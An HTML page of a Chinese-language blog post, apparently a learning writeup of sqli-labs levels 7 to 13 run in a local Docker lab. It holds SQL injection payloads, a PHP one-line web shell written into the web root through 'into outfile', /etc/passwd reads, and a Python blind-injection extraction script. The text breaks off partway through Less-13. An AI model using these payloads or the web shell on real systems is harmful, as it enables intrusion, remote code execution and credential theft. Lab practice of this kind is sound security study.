@@ -1,0 +1,587 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Sqli-labs Wirteup 7-16 - dark moon</title><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=theme-color content=#f8f5ec><meta name=msapplication-navbutton-color content=#f8f5ec><meta name=apple-mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-status-bar-style content=#f8f5ec><meta name=author content=moonD4rk><meta name=description content=整理过去学习资料><meta name=keywords content=SQL注入,sqli-labs><meta name=robots content><meta name=generator content="Hugo 0.54.0 with even 4.0.0"><link rel=canonical href=https://moond4rk.xyz/post/sqlilabs-wirteup-7to16/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/dist/even.58b28b82.min.css rel=stylesheet><link href=/lib/fancybox/jquery.fancybox-3.1.20.min.css rel=stylesheet><meta property=og:title content="Sqli-labs Wirteup 7-16"><meta property=og:description content=整理过去学习资料><meta property=og:type content=article><meta property=og:url content=https://moond4rk.xyz/post/sqlilabs-wirteup-7to16/><meta property=article:published_time content=2019-08-18T16:08:45&#43;08:00><meta property=article:modified_time content=2019-08-18T16:08:45&#43;08:00><meta itemprop=name content="Sqli-labs Wirteup 7-16"><meta itemprop=description content=整理过去学习资料><meta itemprop=datePublished content=2019-08-18T16:08:45&#43;08:00><meta itemprop=dateModified content=2019-08-18T16:08:45&#43;08:00><meta itemprop=wordCount content=2683><meta itemprop=keywords content=SQL注入,安全,writeup,sqli-labs,><meta name=twitter:card content=summary><meta name=twitter:title content="Sqli-labs Wirteup 7-16"><meta name=twitter:description content=整理过去学习资料><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>Dark Moon</a></div><div class=mobile-navbar-icon><span></span><span></span><span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/post/><li class=mobile-menu-item>归档</li></a><a href=/tags/><li class=mobile-menu-item>标签</li></a><a href=/categories/><li class=mobile-menu-item>分类</li></a><a href=/about/><li class=mobile-menu-item>关于</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>Dark Moon</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/post/>归档</a></li><li class=menu-item><a class=menu-item-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-item-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-item-link href=/about/>关于</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Sqli-labs Wirteup 7-16</h1><div class=post-meta><span class=post-time>2019-08-18</span><div class=post-category><a href=/categories/%E6%8A%80%E6%9C%AF/>技术</a></div></div></header><div class=post-content><h2 id=前言>前言</h2><p>环境搭建，建议大佬写好的 docker 快速启动</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>git clone https://github.com/c0ny1/vulstudy
+<span class=nb>cd</span> sqli-labs <span class=o>&amp;&amp;</span> docker-compose up -d</code></pre></td></tr></table></div></div><p>具体代码可以通过 <code>https://github.com/Audi-1/sqli-labs</code> 在线浏览</p><h2 id=less-07>Less-07</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>$id=$_GET[&#39;id&#39;];
+$sql=&#34;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&#34;;
+$result=mysql_query($sql);</code></pre></td></tr></table></div></div><p>引用先知<a href=https://xz.aliyun.com/t/7169>对MYSQL注入相关内容及部分Trick的归类小结</a> 这篇文章了解一下 Mysql 中的文件读写</p><h4 id=mysql-中的文件读写>mysql 中的文件读写</h4><p>我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是<code>file_priv</code>和<code>secure-file-priv</code>。</p><p>简单的说：<code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>select file_priv from mysql.user where user=$USER host=$HOST;</pre></td></tr></table></div></div><p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><ul><li>无内容，表示无限制。</li><li>为NULL，表示禁止文件读/写。</li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p><p>三种方法查看当前<code>secure-file-priv</code>的值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></pre></td><td class=lntd><pre class=chroma>select @@secure_file_priv;
+select @@global.secure_file_priv;
+show variables like &#34;secure_file_priv&#34;;</pre></td></tr></table></div></div><p>修改：</p><ul><li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li><li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li></ul><h3 id=读>读</h3><p>Mysql读取文件通常使用load_file函数，语法如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>select load_file(file_path);</pre></td></tr></table></div></div><p>第二种读文件的方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>load data infile &#34;/etc/passwd&#34; into table test FIELDS TERMINATED BY &#39;\n&#39;; #读取服务端文件</pre></td></tr></table></div></div><p>第三种：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>load data local infile &#34;/etc/passwd&#34; into table test FIELDS TERMINATED BY &#39;\n&#39;; #读取客户端文件</pre></td></tr></table></div></div><p>限制：</p><ul><li>前两种需要<code>secure-file-priv</code>无值或为有利目录。</li><li>都需要知道要读取的文件所在的绝对路径。</li><li>要读取的文件大小必须小于<code>max_allowed_packet</code>所设置的值</li></ul><h3 id=写>写</h3><p>说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma>select 1,&#34;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&#34; into outfile &#39;/var/www/html/1.php&#39;;
+select 2,&#34;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&#34; into dumpfile &#39;/var/www/html/1.php&#39;;</pre></td></tr></table></div></div><p>限制：</p><ul><li><code>secure-file-priv</code>无值或为可利用的目录</li><li>需知道目标目录的绝对目录地址</li><li>目标目录可写，mysql的权限足够。</li></ul><h4 id=日志法>日志法</h4><p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p><p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></pre></td><td class=lntd><pre class=chroma>//请求日志
+mysql&gt; set global general_log_file = &#39;/var/www/html/1.php&#39;;
+mysql&gt; set global general_log = on;
+//慢查询日志
+mysql&gt; set global slow_query_log_file=&#39;/var/www/html/2.php&#39;
+mysql&gt; set global slow_query_log=1;
+//还有其他很多日志都可以进行利用
+...</pre></td></tr></table></div></div><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><p>先用其他章节爆出绝对路径</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></pre></td><td class=lntd><pre class=chroma>http://172.20.163.248/Less-1/?id=-1&#39;  union select 1,@@basedir,@@datadir --+
+# 输出
+Welcome    Dhakkan
+Your Login name:/usr
+Your Password:/var/lib/mysql/</pre></td></tr></table></div></div><p>将数据写入 <code>/var/www/html/Less-7/dump.txt</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>http://172.20.163.248/Less-7/?id<span class=o>=</span><span class=m>1</span><span class=s1>&#39;)) union select 1,2,3 into outfile &#39;</span>/var/www/html/Less-7/dump.txt<span class=s1>&#39;--+
+</span><span class=s1># 进入docker查看目录
+</span><span class=s1>root@5d2ca21ff78d:/var/www/html/Less-7# ls
+</span><span class=s1>dump.txt  index.php  result.txt
+</span><span class=s1>root@5d2ca21ff78d:/var/www/html/Less-7# cat dump.txt
+</span><span class=s1>1	Dumb	Dumb
+</span><span class=s1>1	2	3
+</span><span class=s1># 写入一句话木马
+</span><span class=s1>
+</span><span class=s1>http://172.20.163.248/Less-7/?id=1&#39;</span><span class=o>))</span> union <span class=k>select</span> <span class=m>1</span>,2,<span class=s2>&#34;&lt;?php eval(@</span><span class=nv>$_POST</span><span class=s2>[&#39;a&#39;]); ?&gt;&#34;</span> into outfile <span class=s1>&#39;/var/www/html/Less-7/dump.txt&#39;</span>--+</code></pre></td></tr></table></div></div><h2 id=less-08>Less-08</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>$sql=&#34;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&#34;;</code></pre></td></tr></table></div></div><p>使用不同 <code>payload</code> 测试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></pre></td><td class=lntd><pre class=chroma>http://172.20.163.248/Less-8/?id=1&#39; and &#39;2&#39;=&#39;2 --+
+http://172.20.163.248/Less-8/?id=1&#39; and &#39;2&#39;=&#39;1 --+
+http://172.20.163.248/Less-8/?id=1&#39;and 1 and sleep(5) --+
+http://172.20.163.248/Less-8/?id=1&#39;and 1 and sleep(5) --+
+# 返回页面不同，可看到是 Bool 型盲注</pre></td></tr></table></div></div><p>使用二分法脚本爆出数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python</span>
+<span class=c1># encoding:utf8</span>
+
+<span class=kn>import</span> <span class=nn>requests</span>
+<span class=kn>import</span> <span class=nn>time</span>
+<span class=kn>import</span> <span class=nn>sys</span>
+
+<span class=c1># config-start</span>
+<span class=n>sleep_time</span> <span class=o>=</span> <span class=mi>5</span>
+<span class=n>error_time</span> <span class=o>=</span> <span class=mi>1</span>
+<span class=c1># config-end</span>
+
+<span class=n>proxy</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>,</span> <span class=s2>&#34;https&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.01:8080&#34;</span><span class=p>}</span>
+
+<span class=k>def</span> <span class=nf>getPayload</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>mid</span><span class=p>):</span>
+    <span class=n>column_name</span> <span class=o>=</span> <span class=s2>&#34;schema_name&#34;</span>
+    <span class=n>table_name</span> <span class=o>=</span> <span class=s2>&#34;schemata&#34;</span>
+    <span class=n>database_name</span> <span class=o>=</span> <span class=s2>&#34;information_schema&#34;</span>
+    <span class=n>startStr</span> <span class=o>=</span> <span class=s2>&#34;1&#39;and &#34;</span>
+    <span class=n>endStr</span> <span class=o>=</span> <span class=s2>&#34; and&#39;1&#39;=&#39;1&#34;</span>
+    <span class=n>payload</span> <span class=o>=</span> <span class=p>(</span>
+        <span class=s2>&#34;((ascii(substring((select &#34;</span>
+        <span class=o>+</span> <span class=n>column_name</span>
+        <span class=o>+</span> <span class=s2>&#34; from &#34;</span>
+        <span class=o>+</span> <span class=n>database_name</span>
+        <span class=o>+</span> <span class=s2>&#34;.&#34;</span>
+        <span class=o>+</span> <span class=n>table_name</span>
+        <span class=o>+</span> <span class=s2>&#34;  limit &#34;</span>
+        <span class=o>+</span> <span class=n>indexOfResult</span>
+        <span class=o>+</span> <span class=s2>&#34;,1),&#34;</span>
+        <span class=o>+</span> <span class=n>indexOfChar</span>
+        <span class=o>+</span> <span class=s2>&#34;,1)))&gt;&#34;</span>
+        <span class=o>+</span> <span class=n>mid</span>
+        <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
+    <span class=p>)</span>
+    <span class=n>payload</span> <span class=o>=</span> <span class=n>startStr</span> <span class=o>+</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>endStr</span>
+    <span class=k>return</span> <span class=n>payload</span>
+
+
+<span class=k>def</span> <span class=nf>exce</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>mid</span><span class=p>):</span>
+    <span class=c1># content-start</span>
+    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://172.20.163.248/Less-8/?id=&#34;</span>
+    <span class=n>tempurl</span> <span class=o>=</span> <span class=n>url</span> <span class=o>+</span> <span class=n>getPayload</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
+    <span class=n>content</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>tempurl</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxy</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
+    <span class=c1># content-end</span>
+    <span class=c1># judge-start</span>
+    <span class=k>if</span> <span class=s2>&#34;You are in...........&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>:</span>
+        <span class=k>return</span> <span class=bp>True</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=k>return</span> <span class=bp>False</span>
+    <span class=c1># judge-end</span>
+
+
+<span class=k>def</span> <span class=nf>doubleSearch</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>,</span> <span class=n>indexOfChar</span><span class=p>,</span> <span class=n>left_number</span><span class=p>,</span> <span class=n>right_number</span><span class=p>):</span>
+    <span class=k>while</span> <span class=n>left_number</span> <span class=o>&lt;</span> <span class=n>right_number</span><span class=p>:</span>
+        <span class=n>mid</span> <span class=o>=</span> <span class=nb>int</span><span class=p>((</span><span class=n>left_number</span> <span class=o>+</span> <span class=n>right_number</span><span class=p>)</span> <span class=o>/</span> <span class=mi>2</span><span class=p>)</span>
+        <span class=k>if</span> <span class=n>exce</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>indexOfChar</span> <span class=o>+</span> <span class=mi>1</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>mid</span><span class=p>)):</span>
+            <span class=n>left_number</span> <span class=o>=</span> <span class=n>mid</span>
+        <span class=k>else</span><span class=p>:</span>
+            <span class=n>right_number</span> <span class=o>=</span> <span class=n>mid</span>
+        <span class=k>if</span> <span class=n>left_number</span> <span class=o>==</span> <span class=n>right_number</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
+            <span class=k>if</span> <span class=n>exce</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>indexOfResult</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>indexOfChar</span> <span class=o>+</span> <span class=mi>1</span><span class=p>),</span> <span class=nb>str</span><span class=p>(</span><span class=n>mid</span><span class=p>)):</span>
+                <span class=n>mid</span> <span class=o>+=</span> <span class=mi>1</span>
+                <span class=k>break</span>
+            <span class=k>else</span><span class=p>:</span>
+                <span class=k>break</span>
+    <span class=k>return</span> <span class=nb>chr</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span>
+
+
+<span class=k>def</span> <span class=nf>search</span><span class=p>():</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>  <span class=c1># 需要遍历的查询结果的数量</span>
+        <span class=n>counter</span> <span class=o>=</span> <span class=mi>0</span>
+        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>  <span class=c1># 结果的长度</span>
+            <span class=n>counter</span> <span class=o>+=</span> <span class=mi>1</span>
+            <span class=n>temp</span> <span class=o>=</span> <span class=n>doubleSearch</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>127</span><span class=p>)</span>  <span class=c1># 从255开始查询</span>
+            <span class=k>if</span> <span class=nb>ord</span><span class=p>(</span><span class=n>temp</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>  <span class=c1># 当为1的时候说明已经查询结束</span>
+                <span class=k>break</span>
+            <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>temp</span><span class=p>)</span>
+            <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+        <span class=k>if</span> <span class=n>counter</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>  <span class=c1># 当结果集的所有行都被遍历后退出</span>
+            <span class=k>break</span>
+        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
+        <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+
+<span class=n>search</span><span class=p>()</span></code></pre></td></tr></table></div></div><p>也可以使用 <code>regexp</code>、<code>mid</code>、<code>ord</code> 等函数来爆出数据</p><h2 id=less-09>Less-09</h2><p>延时注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=o>...</span>
+<span class=nv>$sql</span><span class=o>=</span><span class=s2>&#34;SELECT * FROM users WHERE id=&#39;</span><span class=si>$id</span><span class=s2>&#39; LIMIT 0,1&#34;</span><span class=p>;</span>
+<span class=nv>$result</span><span class=o>=</span><span class=nx>mysql_query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>);</span>
+<span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysql_fetch_array</span><span class=p>(</span><span class=nv>$result</span><span class=p>);</span>
+
+	<span class=k>if</span><span class=p>(</span><span class=nv>$row</span><span class=p>)</span>
+	<span class=p>{</span>
+  	<span class=k>echo</span> <span class=s1>&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class=p>;</span>
+  	<span class=k>echo</span> <span class=s1>&#39;You are in...........&#39;</span><span class=p>;</span>
+  	<span class=k>echo</span> <span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
+    	<span class=k>echo</span> <span class=s2>&#34;&lt;/font&gt;&#34;</span><span class=p>;</span>
+  	<span class=p>}</span>
+	<span class=k>else</span>
+	<span class=p>{</span>
+
+	<span class=k>echo</span> <span class=s1>&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class=p>;</span>
+	<span class=k>echo</span> <span class=s1>&#39;You are in...........&#39;</span><span class=p>;</span>
+	<span class=c1>//print_r(mysql_error());
+</span><span class=c1></span>	<span class=c1>//echo &#34;You have an error in your SQL syntax&#34;;
+</span><span class=c1></span>	<span class=k>echo</span> <span class=s2>&#34;&lt;/br&gt;&lt;/font&gt;&#34;</span><span class=p>;</span>
+	<span class=k>echo</span> <span class=s1>&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class=p>;</span>
+
+	<span class=p>}</span>
+<span class=p>}</span>
+	<span class=k>else</span> <span class=p>{</span> <span class=k>echo</span> <span class=s2>&#34;Please input the ID as parameter with numeric value&#34;</span><span class=p>;}</span>
+</code></pre></td></tr></table></div></div><p>不管结果如何，页面显示都不会改变，此时使用延时注入的函数来测试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma># 页面返回有明显延迟
+http://172.20.163.248/Less-9/?id=1&#39;and 1 and sleep(5) --+</pre></td></tr></table></div></div><h2 id=less-10>Less-10</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span></pre></td><td class=lntd><pre class=chroma>$id = &#39;&#34;&#39;.$id.&#39;&#34;&#39;;
+$sql=&#34;SELECT * FROM users WHERE id=$id LIMIT 0,1&#34;;</pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>http://172.20.163.248/Less-10/?id=1&#34;and 1 and sleep(5) --+</pre></td></tr></table></div></div><p>双引号时间盲注</p><h2 id=less-11>Less-11</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>@$sql=&#34;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&#34;;</code></pre></td></tr></table></div></div><p>使用永远成立的条件表达式</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></pre></td><td class=lntd><pre class=chroma>admin&#39; or 1=1#
+# 页面
+Your Login name:Dumb
+Your Password:Dumb</pre></td></tr></table></div></div><p>使用联合注入爆数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></pre></td><td class=lntd><pre class=chroma>-1&#39; union select 1, database()#
+# 页面
+Your Login name:Dumb
+Your Password:Dumb
+-1&#39; union select 1, group_concat(id, &#34;-&#34;, username, &#34;:&#34;, password) from security.users#
+# 页面
+Your Login name:1
+Your Password:1-Dumb:Dumb,2-Angelina:I-kill-you,3-Dummy:p@ssword,4-secure:crappy,5-stupid:stupidity,6-superman:genious,7-batman:mob!le,8-admin:admin,9-admin1:admin1,10-admin2:admin2,11-admin3:admin3,12-dhakkan:dumbo,14-admin4:admin4</pre></td></tr></table></div></div><h2 id=less-12>Less-12</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>$uname=&#39;&#34;&#39;.$uname.&#39;&#34;&#39;;
+$passwd=&#39;&#34;&#39;.$passwd.&#39;&#34;&#39;;
+@$sql=&#34;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&#34;;</code></pre></td></tr></table></div></div><p>使用了双引号和括号，其他和 11 题相似，闭合语句爆数据：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></pre></td><td class=lntd><pre class=chroma>-1&#34;) union select 1, group_concat(id, &#34;-&#34;, username, &#34;:&#34;, password) from security.users#
+# 页面
+Your Login name:1
+Your Password:1-Dumb:Dumb,2-Angelina:I-kill-you,3-Dummy:p@ssword,4-secure:crappy,5-stupid:stupidity,6-superman:genious,7-batman:mob!le,8-admin:admin,9-admin1:admin1,10-admin2:admin2,11-admin3:admin3,12-dhakkan:dumbo,14-admin4:admin4</pre></td></tr></table></div></div><h2 id=less-13>Less-13</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>@$sql=&#34;SELECT username, password FROM users WHERE username=(&#39;$uname&#39;) and password=(&#39;$passwd&#39;) LIMIT 0,1&#34;;</code></pre></td></tr></table></div></div><p>登录后页面无回显</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
